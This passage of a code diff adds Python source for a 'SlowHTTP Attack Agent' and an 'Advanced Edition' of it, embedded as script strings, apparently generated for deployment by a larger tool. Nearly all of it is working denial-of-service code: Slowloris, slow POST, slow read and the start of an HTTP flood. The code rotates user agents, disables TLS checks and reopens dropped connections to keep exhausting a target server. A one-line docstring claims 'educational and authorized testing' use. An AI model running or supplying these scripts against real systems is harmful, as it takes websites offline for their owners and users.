+        print(f"[*] Connections: {num_connections}, Delay: {delay}s, Duration: {duration}s")
+        
+        # Set up signal handler for graceful shutdown
+        def signal_handler(sig, frame):
+            print("\\n[!] Stopping attack...")
+            self.stop_attack()
+        
+        signal.signal(signal.SIGINT, signal_handler)
+        
+        # Start timer for duration
+        end_time = time.time() + duration
+        
+        try:
+            # Generate a random large content length
+            content_length = random.randint(10000000, 1000000000)
+            
+            # Create initial connections
+            for i in range(num_connections):
+                if not self.running:
+                    break
+                
+                try:
+                    # Create socket
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.settimeout(5)
+                    
+                    # Connect to target
+                    s.connect((self.target, self.port))
+                    
+                    # Wrap with SSL if needed
+                    if self.use_ssl:
+                        context = ssl.create_default_context()
+                        context.check_hostname = False
+                        context.verify_mode = ssl.CERT_NONE
+                        s = context.wrap_socket(s, server_hostname=self.target)
+                    
+                    # Send initial HTTP POST request headers
+                    request = f"POST {self.path} HTTP/1.1\\r\\n"
+                    request += f"Host: {self.target}\\r\\n"
+                    request += f"User-Agent: {self.user_agent}\\r\\n"
+                    request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
+                    request += "Accept-Language: en-US,en;q=0.5\\r\\n"
+                    request += "Accept-Encoding: gzip, deflate\\r\\n"
+                    request += "Connection: keep-alive\\r\\n"
+                    request += "Content-Type: application/x-www-form-urlencoded\\r\\n"
+                    request += f"Content-Length: {content_length}\\r\\n"
+                    request += "\\r\\n"
+                    
+                    # Send initial headers
+                    s.send(request.encode())
+                    
+                    # Update stats
+                    with self.lock:
+                        self.stats["connections_active"] += 1
+                        self.stats["packets_sent"] += 1
+                        self.stats["bytes_sent"] += len(request)
+                    
+                    # Add to connections list
+                    self.connections.append(s)
+                    
+                    # Sleep briefly between connections
+                    if i % 100 == 0:
+                        time.sleep(0.1)
+                        
+                except Exception as e:
+                    with self.lock:
+                        self.stats["error_count"] += 1
+                    if i % 100 == 0:
+                        print(f"[!] Error creating connection {i}: {str(e)}")
+            
+            print(f"[*] Established {len(self.connections)} connections")
+            
+            # Send POST data very slowly
+            while time.time() < end_time and self.running:
+                for i, s in enumerate(list(self.connections)):
+                    try:
+                        # Send a small piece of POST data
+                        data_chunk = f"{random.choice('abcdefghijklmnopqrstuvwxyz')}="
+                        s.send(data_chunk.encode())
+                        
+                        # Update stats
+                        with self.lock:
+                            self.stats["packets_sent"] += 1
+                            self.stats["bytes_sent"] += len(data_chunk)
+                            
+                    except Exception as e:
+                        # Connection closed or error, remove it
+                        with self.lock:
+                            self.stats["connections_active"] -= 1
+                            self.stats["error_count"] += 1
+                        
+                        try:
+                            self.connections.remove(s)
+                        except:
+                            pass
+                        
+                        # Try to create a new connection
+                        try:
+                            # Create socket
+                            new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                            new_s.settimeout(5)
+                            
+                            # Connect to target
+                            new_s.connect((self.target, self.port))
+                            
+                            # Wrap with SSL if needed
+                            if self.use_ssl:
+                                context = ssl.create_default_context()
+                                context.check_hostname = False
+                                context.verify_mode = ssl.CERT_NONE
+                                new_s = context.wrap_socket(new_s, server_hostname=self.target)
+                            
+                            # Send initial HTTP POST request headers
+                            request = f"POST {self.path} HTTP/1.1\\r\\n"
+                            request += f"Host: {self.target}\\r\\n"
+                            request += f"User-Agent: {self.user_agent}\\r\\n"
+                            request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
+                            request += "Accept-Language: en-US,en;q=0.5\\r\\n"
+                            request += "Accept-Encoding: gzip, deflate\\r\\n"
+                            request += "Connection: keep-alive\\r\\n"
+                            request += "Content-Type: application/x-www-form-urlencoded\\r\\n"
+                            request += f"Content-Length: {content_length}\\r\\n"
+                            request += "\\r\\n"
+                            
+                            # Send initial headers
+                            new_s.send(request.encode())
+                            
+                            # Update stats
+                            with self.lock:
+                                self.stats["connections_active"] += 1
+                                self.stats["packets_sent"] += 1
+                                self.stats["bytes_sent"] += len(request)
+                            
+                            # Add to connections list
+                            self.connections.append(new_s)
+                            
+                        except Exception:
+                            # Failed to create new connection, just continue
+                            pass
+                
+                # Print status update
+                print(f"[*] Status: {len(self.connections)} connections active, {self.stats['packets_sent']} packets sent")
+                
+                # Sleep before sending more data
+                time.sleep(delay)
+        
+        finally:
+            # Clean up
+            self.stop_attack()
+            print("[*] Attack completed")
+    
+    def slow_read_attack(self, num_connections, delay, duration):
+        """Slow Read attack"""
+        self.running = True
+        self.connections = []
+        self.stats = {
+            "connections_active": 0,
+            "packets_sent": 0,
+            "bytes_sent": 0,
+            "error_count": 0,
+            "response_codes": {}
+        }
+        
+        print(f"[*] Starting Slow Read attack on {self.target}:{self.port}")
+        print(f"[*] Connections: {num_connections}, Delay: {delay}s, Duration: {duration}s")
+        
+        # Set up signal handler for graceful shutdown
+        def signal_handler(sig, frame):
+            print("\\n[!] Stopping attack...")
+            self.stop_attack()
+        
+        signal.signal(signal.SIGINT, signal_handler)
+        
+        # Start timer for duration
+        end_time = time.time() + duration
+        
+        try:
+            # Create initial connections
+            for i in range(num_connections):
+                if not self.running:
+                    break
+                
+                try:
+                    # Create socket
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.settimeout(10)  # Longer timeout for slow read
+                    
+                    # Set a very small receive buffer
+                    s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1)
+                    
+                    # Connect to target
+                    s.connect((self.target, self.port))
+                    
+                    # Wrap with SSL if needed
+                    if self.use_ssl:
+                        context = ssl.create_default_context()
+                        context.check_hostname = False
+                        context.verify_mode = ssl.CERT_NONE
+                        s = context.wrap_socket(s, server_hostname=self.target)
+                    
+                    # Send complete HTTP request with small window size
+                    request = f"GET {self.path} HTTP/1.1\\r\\n"
+                    request += f"Host: {self.target}\\r\\n"
+                    request += f"User-Agent: {self.user_agent}\\r\\n"
+                    request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
+                    request += "Accept-Language: en-US,en;q=0.5\\r\\n"
+                    request += "Accept-Encoding: gzip, deflate\\r\\n"
+                    request += "Connection: keep-alive\\r\\n"
+                    # Add a very small window size
+                    request += "X-Requested-With: XMLHttpRequest\\r\\n"
+                    request += "\\r\\n"
+                    
+                    # Send request
+                    s.send(request.encode())
+                    
+                    # Update stats
+                    with self.lock:
+                        self.stats["connections_active"] += 1
+                        self.stats["packets_sent"] += 1
+                        self.stats["bytes_sent"] += len(request)
+                    
+                    # Add to connections list
+                    self.connections.append(s)
+                    
+                    # Sleep briefly between connections
+                    if i % 100 == 0:
+                        time.sleep(0.1)
+                        
+                except Exception as e:
+                    with self.lock:
+                        self.stats["error_count"] += 1
+                    if i % 100 == 0:
+                        print(f"[!] Error creating connection {i}: {str(e)}")
+            
+            print(f"[*] Established {len(self.connections)} connections")
+            
+            # Read data very slowly
+            while time.time() < end_time and self.running:
+                for i, s in enumerate(list(self.connections)):
+                    try:
+                        # Read a tiny amount of data
+                        try:
+                            s.recv(1)
+                        except socket.timeout:
+                            # Timeout is expected and good for slow read
+                            pass
+                            
+                    except Exception as e:
+                        if not isinstance(e, socket.timeout):
+                            # Connection closed or error (not timeout), remove it
+                            with self.lock:
+                                self.stats["connections_active"] -= 1
+                                self.stats["error_count"] += 1
+                            
+                            try:
+                                self.connections.remove(s)
+                            except:
+                                pass
+                            
+                            # Try to create a new connection
+                            try:
+                                # Create socket
+                                new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                                new_s.settimeout(10)  # Longer timeout for slow read
+                                
+                                # Set a very small receive buffer
+                                new_s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1)
+                                
+                                # Connect to target
+                                new_s.connect((self.target, self.port))
+                                
+                                # Wrap with SSL if needed
+                                if self.use_ssl:
+                                    context = ssl.create_default_context()
+                                    context.check_hostname = False
+                                    context.verify_mode = ssl.CERT_NONE
+                                    new_s = context.wrap_socket(new_s, server_hostname=self.target)
+                                
+                                # Send complete HTTP request with small window size
+                                request = f"GET {self.path} HTTP/1.1\\r\\n"
+                                request += f"Host: {self.target}\\r\\n"
+                                request += f"User-Agent: {self.user_agent}\\r\\n"
+                                request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
+                                request += "Accept-Language: en-US,en;q=0.5\\r\\n"
+                                request += "Accept-Encoding: gzip, deflate\\r\\n"
+                                request += "Connection: keep-alive\\r\\n"
+                                # Add a very small window size
+                                request += "X-Requested-With: XMLHttpRequest\\r\\n"
+                                request += "\\r\\n"
+                                
+                                # Send request
+                                new_s.send(request.encode())
+                                
+                                # Update stats
+                                with self.lock:
+                                    self.stats["connections_active"] += 1
+                                    self.stats["packets_sent"] += 1
+                                    self.stats["bytes_sent"] += len(request)
+                                
+                                # Add to connections list
+                                self.connections.append(new_s)
+                                
+                            except Exception:
+                                # Failed to create new connection, just continue
+                                pass
+                
+                # Print status update
+                print(f"[*] Status: {len(self.connections)} connections active, {self.stats['packets_sent']} packets sent")
+                
+                # Sleep before reading more data
+                time.sleep(delay)
+        
+        finally:
+            # Clean up
+            self.stop_attack()
+            print("[*] Attack completed")
+    
+    def stop_attack(self):
+        """Stop the attack and clean up connections"""
+        self.running = False
+        
+        # Close all connections
+        for s in self.connections:
+            try:
+                s.close()
+            except:
+                pass
+        
+        self.connections = []
+        
+        # Final stats update
+        with self.lock:
+            self.stats["connections_active"] = 0
+        
+        print(f"[*] Attack stopped. Final stats: {json.dumps(self.stats)}")
+
+def main():
+    parser = argparse.ArgumentParser(description="SlowHTTP Attack Agent")
+    parser.add_argument("--target", help="Target hostname or IP")
+    parser.add_argument("--port", type=int, default=80, help="Target port (default: 80)")
+    parser.add_argument("--ssl", action="store_true", help="Use SSL/TLS")
+    parser.add_argument("--path", default="/", help="Target path (default: /)")
+    parser.add_argument("--attack-type", choices=["slowloris", "slow_post", "slow_read"], default="slowloris", help="Attack type")
+    parser.add_argument("--connections", type=int, default=150, help="Number of connections (default: 150)")
+    parser.add_argument("--delay", type=float, default=15, help="Delay between packets in seconds (default: 15)")
+    parser.add_argument("--duration", type=int, default=300, help="Attack duration in seconds (default: 300)")
+    parser.add_argument("--version", action="store_true", help="Show version and exit")
+    
+    args = parser.parse_args()
+    
+    if args.version:
+        print(f"SlowHTTP Attack Agent v{VERSION}")
+        sys.exit(0)
+    
+    if not args.target:
+        parser.print_help()
+        sys.exit(1)
+    
+    # Parse URL if full URL is provided
+    if args.target.startswith(("http://", "https://")):
+        parsed_url = urlparse(args.target)
+        target_host = parsed_url.netloc
+        use_ssl = args.target.startswith("https://")
+        path = parsed_url.path if parsed_url.path else "/"
+        port = parsed_url.port or (443 if use_ssl else 80)
+    else:
+        target_host = args.target
+        use_ssl = args.ssl
+        path = args.path
+        port = args.port
+    
+    # Create attacker
+    attacker = SlowHTTPAttacker(target_host, port, use_ssl, path=path)
+    
+    try:
+        # Launch attack based on type
+        if args.attack_type == "slowloris":
+            attacker.slowloris_attack(args.connections, args.delay, args.duration)
+        elif args.attack_type == "slow_post":
+            attacker.slow_post_attack(args.connections, args.delay, args.duration)
+        elif args.attack_type == "slow_read":
+            attacker.slow_read_attack(args.connections, args.delay, args.duration)
+    except KeyboardInterrupt:
+        print("\\n[INTERRUPTED] Stopping attack...")
+        attacker.stop_attack()
+    except Exception as e:
+        print(f"[ERROR] {str(e)}")
+        attacker.stop_attack()
+    finally:
+        print("[CLEANUP] Attack completed")
+
+if __name__ == "__main__":
     main()
+'''
+    
+    def _get_advanced_agent_script(self):
+        """Get the advanced agent script with additional attack methods"""
+        return '''#!/usr/bin/env python3
+"""
+SlowHTTP Attack Agent - Advanced Edition
+For educational and authorized testing purposes only
+"""
+
+import socket
+import random
+import time
+import sys
+import argparse
+import ssl
+import os
+import signal
+import threading
+import json
+import struct
+from urllib.parse import urlparse
+import select
+
+VERSION = "5.0"
+
+class AdvancedHTTPAttacker:
+    def __init__(self, target, port=80, use_ssl=False, user_agent=None, path="/"):
+        self.target = target
+        self.port = port
+        self.use_ssl = use_ssl
+        self.path = path
+        self.running = False
+        self.connections = []
+        self.lock = threading.Lock()
+        self.stats = {
+            "connections_active": 0,
+            "packets_sent": 0,
+            "bytes_sent": 0,
+            "error_count": 0,
+            "response_codes": {}
+        }
+        
+        # Generate random user agent if not provided
+        if not user_agent:
+            user_agents = [
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+                "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
+                "Mozilla/5.0 (Macintosh; Intel Mac OS X 11.5; rv:90.0) Gecko/20100101 Firefox/90.0",
+                "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_5_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15"
+            ]
+            self.user_agent = random.choice(user_agents)
+        else:
+            self.user_agent = user_agent
+    
+    def slowloris_attack(self, num_connections, delay, duration):
+        """Slowloris (Keep-Alive) attack"""
+        self.running = True
+        self.connections = []
+        self.stats = {
+            "connections_active": 0,
+            "packets_sent": 0,
+            "bytes_sent": 0,
+            "error_count": 0,
+            "response_codes": {}
+        }
+        
+        print(f"[*] Starting Slowloris attack on {self.target}:{self.port}")
+        print(f"[*] Connections: {num_connections}, Delay: {delay}s, Duration: {duration}s")
+        
+        # Set up signal handler for graceful shutdown
+        def signal_handler(sig, frame):
+            print("\\n[!] Stopping attack...")
+            self.stop_attack()
+        
+        signal.signal(signal.SIGINT, signal_handler)
+        
+        # Start timer for duration
+        end_time = time.time() + duration
+        
+        try:
+            # Create initial connections
+            for i in range(num_connections):
+                if not self.running:
+                    break
+                
+                try:
+                    # Create socket
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.settimeout(5)
+                    
+                    # Connect to target
+                    s.connect((self.target, self.port))
+                    
+                    # Wrap with SSL if needed
+                    if self.use_ssl:
+                        context = ssl.create_default_context()
+                        context.check_hostname = False
+                        context.verify_mode = ssl.CERT_NONE
+                        s = context.wrap_socket(s, server_hostname=self.target)
+                    
+                    # Send initial HTTP request headers (incomplete)
+                    request = f"GET {self.path} HTTP/1.1\\r\\n"
+                    request += f"Host: {self.target}\\r\\n"
+                    request += f"User-Agent: {self.user_agent}\\r\\n"
+                    request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
+                    request += "Accept-Language: en-US,en;q=0.5\\r\\n"
+                    request += "Accept-Encoding: gzip, deflate\\r\\n"
+                    request += "Connection: keep-alive\\r\\n"
+                    request += "Cache-Control: no-cache\\r\\n"
+                    
+                    # Send initial headers
+                    s.send(request.encode())
+                    
+                    # Update stats
+                    with self.lock:
+                        self.stats["connections_active"] += 1
+                        self.stats["packets_sent"] += 1
+                        self.stats["bytes_sent"] += len(request)
+                    
+                    # Add to connections list
+                    self.connections.append(s)
+                    
+                    # Sleep briefly between connections
+                    if i % 100 == 0:
+                        time.sleep(0.1)
+                        
+                except Exception as e:
+                    with self.lock:
+                        self.stats["error_count"] += 1
+                    if i % 100 == 0:
+                        print(f"[!] Error creating connection {i}: {str(e)}")
+            
+            print(f"[*] Established {len(self.connections)} connections")
+            
+            # Keep connections alive by sending partial headers
+            while time.time() < end_time and self.running:
+                for i, s in enumerate(list(self.connections)):
+                    try:
+                        # Send a partial header to keep connection alive
+                        partial_header = f"X-a: {random.randint(1, 5000)}\\r\\n"
+                        s.send(partial_header.encode())
+                        
+                        # Update stats
+                        with self.lock:
+                            self.stats["packets_sent"] += 1
+                            self.stats["bytes_sent"] += len(partial_header)
+                            
+                    except Exception as e:
+                        # Connection closed or error, remove it
+                        with self.lock:
+                            self.stats["connections_active"] -= 1
+                            self.stats["error_count"] += 1
+                        
+                        try:
+                            self.connections.remove(s)
+                        except:
+                            pass
+                        
+                        # Try to create a new connection
+                        try:
+                            # Create socket
+                            new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                            new_s.settimeout(5)
+                            
+                            # Connect to target
+                            new_s.connect((self.target, self.port))
+                            
+                            # Wrap with SSL if needed
+                            if self.use_ssl:
+                                context = ssl.create_default_context()
+                                context.check_hostname = False
+                                context.verify_mode = ssl.CERT_NONE
+                                new_s = context.wrap_socket(new_s, server_hostname=self.target)
+                            
+                            # Send initial HTTP request headers (incomplete)
+                            request = f"GET {self.path} HTTP/1.1\\r\\n"
+                            request += f"Host: {self.target}\\r\\n"
+                            request += f"User-Agent: {self.user_agent}\\r\\n"
+                            request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
+                            request += "Accept-Language: en-US,en;q=0.5\\r\\n"
+                            request += "Accept-Encoding: gzip, deflate\\r\\n"
+                            request += "Connection: keep-alive\\r\\n"
+                            request += "Cache-Control: no-cache\\r\\n"
+                            
+                            # Send initial headers
+                            new_s.send(request.encode())
+                            
+                            # Update stats
+                            with self.lock:
+                                self.stats["connections_active"] += 1
+                                self.stats["packets_sent"] += 1
+                                self.stats["bytes_sent"] += len(request)
+                            
+                            # Add to connections list
+                            self.connections.append(new_s)
+                            
+                        except Exception:
+                            # Failed to create new connection, just continue
+                            pass
+                
+                # Print status update
+                print(f"[*] Status: {len(self.connections)} connections active, {self.stats['packets_sent']} packets sent")
+                
+                # Sleep before sending more headers
+                time.sleep(delay)
+        
+        finally:
+            # Clean up
+            self.stop_attack()
+            print("[*] Attack completed")
+    
+    def slow_post_attack(self, num_connections, delay, duration):
+        """Slow POST attack (R.U.D.Y)"""
+        self.running = True
+        self.connections = []
+        self.stats = {
+            "connections_active": 0,
+            "packets_sent": 0,
+            "bytes_sent": 0,
+            "error_count": 0,
+            "response_codes": {}
+        }
+        
+        print(f"[*] Starting Slow POST attack on {self.target}:{self.port}")
+        print(f"[*] Connections: {num_connections}, Delay: {delay}s, Duration: {duration}s")
+        
+        # Set up signal handler for graceful shutdown
+        def signal_handler(sig, frame):
+            print("\\n[!] Stopping attack...")
+            self.stop_attack()
+        
+        signal.signal(signal.SIGINT, signal_handler)
+        
+        # Start timer for duration
+        end_time = time.time() + duration
+        
+        try:
+            # Generate a random large content length
+            content_length = random.randint(10000000, 1000000000)
+            
+            # Create initial connections
+            for i in range(num_connections):
+                if not self.running:
+                    break
+                
+                try:
+                    # Create socket
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.settimeout(5)
+                    
+                    # Connect to target
+                    s.connect((self.target, self.port))
+                    
+                    # Wrap with SSL if needed
+                    if self.use_ssl:
+                        context = ssl.create_default_context()
+                        context.check_hostname = False
+                        context.verify_mode = ssl.CERT_NONE
+                        s = context.wrap_socket(s, server_hostname=self.target)
+                    
+                    # Send initial HTTP POST request headers
+                    request = f"POST {self.path} HTTP/1.1\\r\\n"
+                    request += f"Host: {self.target}\\r\\n"
+                    request += f"User-Agent: {self.user_agent}\\r\\n"
+                    request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
+                    request += "Accept-Language: en-US,en;q=0.5\\r\\n"
+                    request += "Accept-Encoding: gzip, deflate\\r\\n"
+                    request += "Connection: keep-alive\\r\\n"
+                    request += "Content-Type: application/x-www-form-urlencoded\\r\\n"
+                    request += f"Content-Length: {content_length}\\r\\n"
+                    request += "\\r\\n"
+                    
+                    # Send initial headers
+                    s.send(request.encode())
+                    
+                    # Update stats
+                    with self.lock:
+                        self.stats["connections_active"] += 1
+                        self.stats["packets_sent"] += 1
+                        self.stats["bytes_sent"] += len(request)
+                    
+                    # Add to connections list
+                    self.connections.append(s)
+                    
+                    # Sleep briefly between connections
+                    if i % 100 == 0:
+                        time.sleep(0.1)
+                        
+                except Exception as e:
+                    with self.lock:
+                        self.stats["error_count"] += 1
+                    if i % 100 == 0:
+                        print(f"[!] Error creating connection {i}: {str(e)}")
+            
+            print(f"[*] Established {len(self.connections)} connections")
+            
+            # Send POST data very slowly
+            while time.time() < end_time and self.running:
+                for i, s in enumerate(list(self.connections)):
+                    try:
+                        # Send a small piece of POST data
+                        data_chunk = f"{random.choice('abcdefghijklmnopqrstuvwxyz')}="
+                        s.send(data_chunk.encode())
+                        
+                        # Update stats
+                        with self.lock:
+                            self.stats["packets_sent"] += 1
+                            self.stats["bytes_sent"] += len(data_chunk)
+                            
+                    except Exception as e:
+                        # Connection closed or error, remove it
+                        with self.lock:
+                            self.stats["connections_active"] -= 1
+                            self.stats["error_count"] += 1
+                        
+                        try:
+                            self.connections.remove(s)
+                        except:
+                            pass
+                        
+                        # Try to create a new connection
+                        try:
+                            # Create socket
+                            new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                            new_s.settimeout(5)
+                            
+                            # Connect to target
+                            new_s.connect((self.target, self.port))
+                            
+                            # Wrap with SSL if needed
+                            if self.use_ssl:
+                                context = ssl.create_default_context()
+                                context.check_hostname = False
+                                context.verify_mode = ssl.CERT_NONE
+                                new_s = context.wrap_socket(new_s, server_hostname=self.target)
+                            
+                            # Send initial HTTP POST request headers
+                            request = f"POST {self.path} HTTP/1.1\\r\\n"
+                            request += f"Host: {self.target}\\r\\n"
+                            request += f"User-Agent: {self.user_agent}\\r\\n"
+                            request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
+                            request += "Accept-Language: en-US,en;q=0.5\\r\\n"
+                            request += "Accept-Encoding: gzip, deflate\\r\\n"
+                            request += "Connection: keep-alive\\r\\n"
+                            request += "Content-Type: application/x-www-form-urlencoded\\r\\n"
+                            request += f"Content-Length: {content_length}\\r\\n"
+                            request += "\\r\\n"
+                            
+                            # Send initial headers
+                            new_s.send(request.encode())
+                            
+                            # Update stats
+                            with self.lock:
+                                self.stats["connections_active"] += 1
+                                self.stats["packets_sent"] += 1
+                                self.stats["bytes_sent"] += len(request)
+                            
+                            # Add to connections list
+                            self.connections.append(new_s)
+                            
+                        except Exception:
+                            # Failed to create new connection, just continue
+                            pass
+                
+                # Print status update
+                print(f"[*] Status: {len(self.connections)} connections active, {self.stats['packets_sent']} packets sent")
+                
+                # Sleep before sending more data
+                time.sleep(delay)
+        
+        finally:
+            # Clean up
+            self.stop_attack()
+            print("[*] Attack completed")
+    
+    def slow_read_attack(self, num_connections, delay, duration):
+        """Slow Read attack"""
+        self.running = True
+        self.connections = []
+        self.stats = {
+            "connections_active": 0,
+            "packets_sent": 0,
+            "bytes_sent": 0,
+            "error_count": 0,
+            "response_codes": {}
+        }
+        
+        print(f"[*] Starting Slow Read attack on {self.target}:{self.port}")
+        print(f"[*] Connections: {num_connections}, Delay: {delay}s, Duration: {duration}s")
+        
+        # Set up signal handler for graceful shutdown
+        def signal_handler(sig, frame):
+            print("\\n[!] Stopping attack...")
+            self.stop_attack()
+        
+        signal.signal(signal.SIGINT, signal_handler)
+        
+        # Start timer for duration
+        end_time = time.time() + duration
+        
+        try:
+            # Create initial connections
+            for i in range(num_connections):
+                if not self.running:
+                    break
+                
+                try:
+                    # Create socket
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.settimeout(10)  # Longer timeout for slow read
+                    
+                    # Set a very small receive buffer
+                    s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1)
+                    
+                    # Connect to target
+                    s.connect((self.target, self.port))
+                    
+                    # Wrap with SSL if needed
+                    if self.use_ssl:
+                        context = ssl.create_default_context()
+                        context.check_hostname = False
+                        context.verify_mode = ssl.CERT_NONE
+                        s = context.wrap_socket(s, server_hostname=self.target)
+                    
+                    # Send complete HTTP request with small window size
+                    request = f"GET {self.path} HTTP/1.1\\r\\n"
+                    request += f"Host: {self.target}\\r\\n"
+                    request += f"User-Agent: {self.user_agent}\\r\\n"
+                    request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
+                    request += "Accept-Language: en-US,en;q=0.5\\r\\n"
+                    request += "Accept-Encoding: gzip, deflate\\r\\n"
+                    request += "Connection: keep-alive\\r\\n"
+                    # Add a very small window size
+                    request += "X-Requested-With: XMLHttpRequest\\r\\n"
+                    request += "\\r\\n"
+                    
+                    # Send request
+                    s.send(request.encode())
+                    
+                    # Update stats
+                    with self.lock:
+                        self.stats["connections_active"] += 1
+                        self.stats["packets_sent"] += 1
+                        self.stats["bytes_sent"] += len(request)
+                    
+                    # Add to connections list
+                    self.connections.append(s)
+                    
+                    # Sleep briefly between connections
+                    if i % 100 == 0:
+                        time.sleep(0.1)
+                        
+                except Exception as e:
+                    with self.lock:
+                        self.stats["error_count"] += 1
+                    if i % 100 == 0:
+                        print(f"[!] Error creating connection {i}: {str(e)}")
+            
+            print(f"[*] Established {len(self.connections)} connections")
+            
+            # Read data very slowly
+            while time.time() < end_time and self.running:
+                for i, s in enumerate(list(self.connections)):
+                    try:
+                        # Read a tiny amount of data
+                        try:
+                            s.recv(1)
+                        except socket.timeout:
+                            # Timeout is expected and good for slow read
+                            pass
+                            
+                    except Exception as e:
+                        if not isinstance(e, socket.timeout):
+                            # Connection closed or error (not timeout), remove it
+                            with self.lock:
+                                self.stats["connections_active"] -= 1
+                                self.stats["error_count"] += 1
+                            
+                            try:
+                                self.connections.remove(s)
+                            except:
+                                pass
+                            
+                            # Try to create a new connection
+                            try:
+                                # Create socket
+                                new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                                new_s.settimeout(10)  # Longer timeout for slow read
+                                
+                                # Set a very small receive buffer
+                                new_s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1)
+                                
+                                # Connect to target
+                                new_s.connect((self.target, self.port))
+                                
+                                # Wrap with SSL if needed
+                                if self.use_ssl:
+                                    context = ssl.create_default_context()
+                                    context.check_hostname = False
+                                    context.verify_mode = ssl.CERT_NONE
+                                    new_s = context.wrap_socket(new_s, server_hostname=self.target)
+                                
+                                # Send complete HTTP request with small window size
+                                request = f"GET {self.path} HTTP/1.1\\r\\n"
+                                request += f"Host: {self.target}\\r\\n"
+                                request += f"User-Agent: {self.user_agent}\\r\\n"
+                                request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
+                                request += "Accept-Language: en-US,en;q=0.5\\r\\n"
+                                request += "Accept-Encoding: gzip, deflate\\r\\n"
+                                request += "Connection: keep-alive\\r\\n"
+                                # Add a very small window size
+                                request += "X-Requested-With: XMLHttpRequest\\r\\n"
+                                request += "\\r\\n"
+                                
+                                # Send request
+                                new_s.send(request.encode())
+                                
+                                # Update stats
+                                with self.lock:
+                                    self.stats["connections_active"] += 1
+                                    self.stats["packets_sent"] += 1
+                                    self.stats["bytes_sent"] += len(request)
+                                
+                                # Add to connections list
+                                self.connections.append(new_s)
+                                
+                            except Exception:
+                                # Failed to create new connection, just continue
+                                pass
+                
+                # Print status update
+                print(f"[*] Status: {len(self.connections)} connections active, {self.stats['packets_sent']} packets sent")
+                
+                # Sleep before reading more data
+                time.sleep(delay)
+        
+        finally:
+            # Clean up
+            self.stop_attack()
+            print("[*] Attack completed")
+    
+    def http_flood_attack(self, num_connections, requests_per_connection, duration):
+        """HTTP Flood attack"""
+        self.running = True
+        self.connections = []
+        self.stats = {
+            "connections_active": 0,
+            "packets_sent": 0,
+            "bytes_sent": 0,
+            "error_count": 0,
+            "response_codes": {}
+        }
+        
+        print(f"[*] Starting HTTP Flood attack on {self.target}:{self.port}")
+        print(f"[*] Connections: {num_connections}, Requests per connection: {requests_per_connection}, Duration: {duration}s")
+        
+        # Set up signal handler for graceful shutdown
+        def signal_handler(sig, frame):
+            print("\\n[!] Stopping attack...")
+            self.stop_attack()
+        
+        signal.signal(signal.SIGINT, signal_handler)
+        
+        # Start timer for duration
+        end_time = time.time() + duration
+        
+        # Generate random paths for the requests
+        paths = [
+            self.path,
+            f"{self.path}?id={random.randint(1, 1000)}",
+            f"{self.path}?page={random.randint(1, 100)}",
+            f"{self.path}?search={random.choice('abcdefghijklmnopqrstuvwxyz')}",
+            f"{self.path}?ref={random.randint(1000, 9999)}"
+        ]
+        
+        # Create thread pool for sending requests
+        threads = []
+        
+        def send_requests(thread_id):
+            requests_sent = 0
+            errors = 0
+            bytes_sent = 0
+            response_codes = {}
+            
+            while time.time() < end_time and self.running and requests_sent < requests_per_connection:
+                try:
+                    # Create socket
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.settimeout(5)
+                    
+                    # Connect to target
+                    s.connect((self.target, self.port))
+                    
+                    # Wrap with SSL if needed
+                    if self.use_ssl:
+                        context = ssl.create_default_context()
+                        context.check_hostname = False
+                        context.verify_mode = ssl.CERT_NONE
+                        s = context.wrap_socket(s, server_hostname=self.target)
+                    
+                    # Choose random path
+                    path = random.choice(paths)
+                    
+                    # Send complete HTTP request
+                    request = f"GET {path} HTTP/1.1\\r\\n"
+                    request += f"Host: {self.target}\\r\\n"
+                    request += f"User-Agent: {self.user_agent}\\r\\n"
+                    request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n"
+                    request += "Accept-Language: en-US,en;q=0.5\\r\\n"
+                    request += "Accept-Encoding: gzip, deflate\\r\\n"
+                    request += "Connection: close\\r\\n"  # Close connection after response
+                    request += "Cache-Control: no-cache\\r\\n"
+                    request += f"X-Request-ID: {random.randint(1000000, 9999999)}\\r\\n"
+                    request += "\\r\\n"
+                    
+                    # Send request
+                    s.send(request.encode())
+                    
+                    # Update local stats
+                    requests_sent += 1
+                    bytes_sent += len(request)
+                    
